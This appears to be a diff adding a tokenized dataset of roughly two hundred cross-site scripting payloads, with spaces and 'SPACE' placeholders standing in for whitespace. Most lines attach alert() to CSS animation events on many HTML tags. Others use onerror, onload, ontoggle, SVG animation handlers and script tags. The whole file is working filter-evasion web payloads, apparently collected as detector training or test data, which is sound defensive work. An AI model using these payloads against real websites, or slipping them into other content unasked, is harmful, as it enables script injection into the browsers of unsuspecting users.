@@ -1,0 +1,891 @@
+< input SPACE type=image SPACE src=1 SPACE onerror=alert ( 1 ) >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < center SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /center >
+< style > @ keyframes SPACE x { } < /style > < main SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /main >
+< style > @ keyframes SPACE x { } < /style > < nobr SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /nobr >
+< iframe SPACE onload=alert ( 1 ) > < /iframe >
+< style > @ keyframes SPACE x { } < /style > < h1 SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /h1 >
+< style > @ keyframes SPACE x { } < /style > < area SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /area >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < shadow SPACE style = " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /shadow >
+< style > @ keyframes SPACE x { } < /style > < body SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /body >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < ins SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration = " alert ( 1 ) " > < /ins >
+< style > @ keyframes SPACE x { } < /style > < plaintext SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /plaintext >
+< image SPACE srcset=1 SPACE onerror=alert ( 1 ) >
+< style > @ keyframes SPACE x { } < /style > < shadow SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /shadow >
+< style > @ keyframes SPACE x { } < /style > < ins SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /ins >
+< style > @ keyframes SPACE x { } < /style > < rtc SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /rtc >
+< style > @ keyframes SPACE x { } < /style > < main SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /main >
+< details SPACE ontoggle=alert ( 1 ) SPACE open > test < /details >
+< style > @ keyframes SPACE x { } < /style > < rb SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /rb >
+< style > @ keyframes SPACE x { } < /style > < address SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /address >
+< style > @ keyframes SPACE x { } < /style > < ruby SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /ruby >
+< style > @ keyframes SPACE x { } < /style > < svg SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /svg >
+< style > @ keyframes SPACE x { } < /style > < pre SPACE style = " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /pre >
+< style > @ keyframes SPACE x { } < /style > < fieldset SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /fieldset >
+< style > @ keyframes SPACE x { } < /style > < menuitem SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /menuitem >
+< style > @ keyframes SPACE x { } < /style > < dl SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /dl >
+< style > @ keyframes SPACE x { } < /style > < dt SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /dt >
+< style > @ keyframes SPACE x { } < /style > < dd SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /dd >
+< style > @ keyframes SPACE x { } < /style > < em SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /em >
+< style > @ keyframes SPACE x { } < /style > < form SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /form >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < html SPACE style = " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration = " alert ( 1 ) " > < /html >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < sub SPACE style = " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration = " alert ( 1 ) " > < /sub >
+< style > @ keyframes SPACE x { } < /style > < mark SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /mark >
+< style > @ keyframes SPACE x { } < /style > < select SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /select >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < element SPACE style = " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration = " alert ( 1 ) " > < /element >
+< style > @ keyframes SPACE x { } < /style > < h1 SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /h1 >
+< style > @ keyframes SPACE x { } < /style > < dl SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /dl >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < content SPACE style = " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration = " alert ( 1 ) " > < /content >
+< SCRIPT > alert ( `` ) ; < /SCRIPT >
+< style > @ keyframes SPACE x { } < /style > < command SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /command >
+< svg > < animate SPACE onbegin=alert ( 1 ) SPACE attributeName=x SPACE dur=1s >
+< style > @ keyframes SPACE x { } < /style > < source SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /source >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < dd SPACE style = " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration = " alert ( 1 ) " > < /dd >
+< style > @ keyframes SPACE x { } < /style > < xss SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /xss >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < q SPACE style = " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration = " alert ( 1 ) " > < /q >
+< style > @ keyframes SPACE x { } < /style > < textarea SPACE style = " animation-name : x " SPACE onanimationend = " alert ( 1 ) " > < /textarea >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < bdi SPACE style = " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration = " alert ( 1 ) " > < /bdi >
+< style > @ keyframes SPACE x { } < /style > < figure SPACE style = " animation-name : x " SPACE onanimationstart = " alert ( 1 ) " > < /figure >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < option SPACE style = " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration = " alert ( 1 ) " > < /option >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < rt SPACE style = " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration = " alert ( 1 ) " > < /rt >
+< style > @ keyframes SPACE x { } < /style > < s SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /s >
+< style > @ keyframes SPACE x { } < /style > < i SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /i >
+< style > @ keyframes SPACE x { } < /style > < big SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /big >
+< style > @ keyframes SPACE x { } < /style > < time SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /time >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < dt SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /dt >
+< style > @ keyframes SPACE x { } < /style > < spacer SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /spacer >
+< style > @ keyframes SPACE x { } < /style > < area SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /area >
+< style > @ keyframes SPACE x { } < /style > < a SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /a >
+< style > @ keyframes SPACE x { } < /style > < track SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /track >
+< style > @ keyframes SPACE x { } < /style > < samp SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /samp >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < ol SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /ol >
+< style > @ keyframes SPACE x { } < /style > < slot SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /slot >
+< style > @ keyframes SPACE x { } < /style > < nobr SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /nobr >
+< style > @ keyframes SPACE x { } < /style > < isindex SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /isindex >
+< img SPACE src/onerror=alert ( 1 ) >
+< style > @ keyframes SPACE x { } < /style > < bdi SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /bdi >
+< embed SPACE src=1 SPACE onerror=alert ( 1 ) SPACE type=image/gif >
+< style > @ keyframes SPACE x { } < /style > < header SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /header >
+< svg > < animatetransform SPACE onrepeat=alert ( 1 ) SPACE attributeName=transform SPACE repeatCount=2 SPACE dur=1s >
+< style > @ keyframes SPACE x { } < /style > < strike SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /strike >
+< SCRIPT > alert ( `` ) ; < /SCRIPT >
+< style > @ keyframes SPACE x { } < /style > < i SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /i >
+< fieldset SPACE onmouseenter= " alert ( 1 ) " > test < /fieldset >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < code SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /code >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < s SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /s >
+< style > @ keyframes SPACE x { } < /style > < element SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /element >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < blockquote SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /blockquote >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < wbr SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /wbr >
+< audio SPACE src/onerror=alert ( 1 ) >
+< style > @ keyframes SPACE x { } < /style > < footer SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /footer >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < spacer SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /spacer >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < form SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /form >
+< style > @ keyframes SPACE x { } < /style > < meter SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /meter >
+< style > @ keyframes SPACE x { } < /style > < button SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /button >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < dfn SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /dfn >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < ruby SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /ruby >
+< style > @ keyframes SPACE x { } < /style > < keygen SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /keygen >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < bdo SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /bdo >
+< style > @ keyframes SPACE x { } < /style > < del SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /del >
+< svg/onload=alert ( `` ) >
+< style > @ keyframes SPACE x { } < /style > < ruby SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /ruby >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < cite SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /cite >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < iframe SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /iframe >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < canvas SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /canvas >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < xss SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /xss >
+< style > @ keyframes SPACE x { } < /style > < em SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /em >
+< style > @ keyframes SPACE x { } < /style > < slot SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /slot >
+< style > @ keyframes SPACE x { } < /style > < header SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /header >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < table SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /table >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < multicol SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /multicol >
+< style > @ keyframes SPACE x { } < /style > < p SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /p >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < nav SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /nav >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < span SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /span >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < u SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /u >
+< style > @ keyframes SPACE x { } < /style > < progress SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /progress >
+< style > @ keyframes SPACE x { } < /style > < legend SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /legend >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < a SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /a >
+< style > @ keyframes SPACE x { } < /style > < bdi SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /bdi >
+< IMG SPACE `` " " > < SCRIPT > alert ( `` " ) < /SCRIPT > " \ >
+< style > @ keyframes SPACE x { } < /style > < pre SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /pre >
+< style > @ keyframes SPACE x { } < /style > < blink SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /blink >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < font SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /font >
+< style > @ keyframes SPACE x { } < /style > < svg SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /svg >
+< style > @ keyframes SPACE x { } < /style > < multicol SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /multicol >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < track SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /track >
+< style > @ keyframes SPACE x { } < /style > < time SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /time >
+< style > @ keyframes SPACE x { } < /style > < table SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /table >
+< style > @ keyframes SPACE x { } < /style > < optgroup SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /optgroup >
+< style > @ keyframes SPACE x { } < /style > < track SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /track >
+< style > @ keyframes SPACE x { } < /style > < figure SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /figure >
+< style > @ keyframes SPACE x { } < /style > < strong SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /strong >
+< style > @ keyframes SPACE x { } < /style > < multicol SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /multicol >
+< style > @ keyframes SPACE x { } < /style > < dir SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /dir >
+< style > @ keyframes SPACE x { } < /style > < select SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /select >
+< svg > < path > < animateMotion SPACE onrepeat=alert ( 1 ) SPACE dur= " 1s " SPACE repeatCount= " 2 " >
+< style > @ keyframes SPACE x { } < /style > < ul SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /ul >
+< style > @ keyframes SPACE x { } < /style > < span SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /span >
+< style > @ keyframes SPACE x { } < /style > < br SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /br >
+< style > @ keyframes SPACE x { } < /style > < input SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /input >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < footer SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /footer >
+< object SPACE onerror=alert ( 1 ) SPACE data=1 SPACE type=image/gif >
+< style > @ keyframes SPACE x { } < /style > < nextid SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /nextid >
+< style > @ keyframes SPACE x { } < /style > < abbr SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /abbr >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < dir SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /dir >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < rb SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /rb >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < figure SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /figure >
+< style > @ keyframes SPACE x { } < /style > < meter SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /meter >
+< style > @ keyframes SPACE x { } < /style > < label SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /label >
+< SCRIPT SPACE DEFER > alert ( `` " ) < /SCRIPT >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < dl SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /dl >
+< style > @ keyframes SPACE x { } < /style > < li SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /li >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < b SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /b >
+< style > @ keyframes SPACE x { } < /style > < samp SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /samp >
+< style > @ keyframes SPACE x { } < /style > < nav SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /nav >
+< style > @ keyframes SPACE x { } < /style > < body SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /body >
+< svg > < animate SPACE onrepeat=alert ( 1 ) SPACE attributeName=x SPACE dur=1s SPACE repeatCount=2 SPACE / >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < area SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /area >
+< style > @ keyframes SPACE x { } < /style > < picture SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /picture >
+< style > @ keyframes SPACE x { } < /style > < code SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /code >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < big SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /big >
+< style > @ keyframes SPACE x { } < /style > < b SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /b >
+< style > @ keyframes SPACE x { } < /style > < data SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /data >
+< BODY SPACE ONLOAD=alert ( `` ) >
+< style > @ keyframes SPACE x { } < /style > < html SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /html >
+< style > @ keyframes SPACE x { } < /style > < isindex SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /isindex >
+< img SPACE src=x : alert ( alt ) SPACE onerror=eval ( src ) SPACE alt=0 >
+< svg > < set SPACE onrepeat=alert ( 1 ) SPACE attributename=x SPACE dur=1s SPACE repeatcount=2 >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < hr SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /hr >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < listing SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /listing >
+< style > @ keyframes SPACE x { } < /style > < var SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /var >
+< style > @ keyframes SPACE x { } < /style > < var SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /var >
+< svg > < animatetransform SPACE onbegin=alert ( 1 ) SPACE attributeName=transform >
+< style > @ keyframes SPACE x { } < /style > < xss SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /xss >
+< style > @ keyframes SPACE x { } < /style > < label SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /label >
+< iframe/src= " data : text/html , < svg SPACE onload=alert ( 1 ) > " >
+< style > @ keyframes SPACE x { } < /style > < sub SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /sub >
+< style > @ keyframes SPACE x { } < /style > < applet SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /applet >
+< style > @ keyframes SPACE x { } < /style > < rt SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /rt >
+`` > < img SPACE src= " x : x " SPACE onerror= " alert ( ) " >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < command SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /command >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < time SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /time >
+< body SPACE onerror=alert ( 1 ) SPACE onload=/ >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < strong SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /strong >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < h1 SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /h1 >
+< style > @ keyframes SPACE x { } < /style > < spacer SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /spacer >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < applet SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /applet >
+< style > @ keyframes SPACE x { } < /style > < font SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /font >
+< style > @ keyframes SPACE x { } < /style > < b SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /b >
+< style > @ keyframes SPACE x { } < /style > < span SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /span >
+< img SPACE srcset=1 SPACE onerror=alert ( 1 ) >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < main SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /main >
+< style > @ keyframes SPACE x { } < /style > < input SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /input >
+< style > @ keyframes SPACE x { } < /style > < video SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /video >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < header SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /header >
+< style > @ keyframes SPACE x { } < /style > < content SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /content >
+< video > < source SPACE onerror=alert ( 1 ) SPACE src=1 > < /video >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < video SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /video >
+< object SPACE data=/ SPACE onload=alert ( 1 ) >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < ul SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /ul >
+< svg > < animate SPACE onend=alert ( 1 ) SPACE attributeName=x SPACE dur=1s >
+< script SPACE x > SPACE alert ( 1 ) SPACE < /script SPACE 1=2
+< style > @ keyframes SPACE x { } < /style > < shadow SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /shadow >
+< style > @ keyframes SPACE x { } < /style > < canvas SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /canvas >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < fieldset SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /fieldset >
+< style > @ keyframes SPACE x { } < /style > < small SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /small >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < strike SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /strike >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < button SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /button >
+< video SPACE src/onerror=alert ( 1 ) >
+< style > @ keyframes SPACE x { } < /style > < hgroup SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /hgroup >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < textarea SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /textarea >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < plaintext SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /plaintext >
+< Video > SPACE < source SPACE onerror SPACE = SPACE `` javascript : SPACE alert SPACE ( ) " >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < rtc SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /rtc >
+< style > @ keyframes SPACE x { } < /style > < hgroup SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /hgroup >
+< style > @ keyframes SPACE x { } < /style > < bdo SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /bdo >
+< style > @ keyframes SPACE x { } < /style > < tt SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /tt >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < meter SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /meter >
+< svg > < path > < animateMotion SPACE onend=alert ( 1 ) SPACE dur=1s SPACE repeatCount=1 >
+< style > @ keyframes SPACE x { } < /style > < strong SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /strong >
+< style > @ keyframes SPACE x { } < /style > < summary SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /summary >
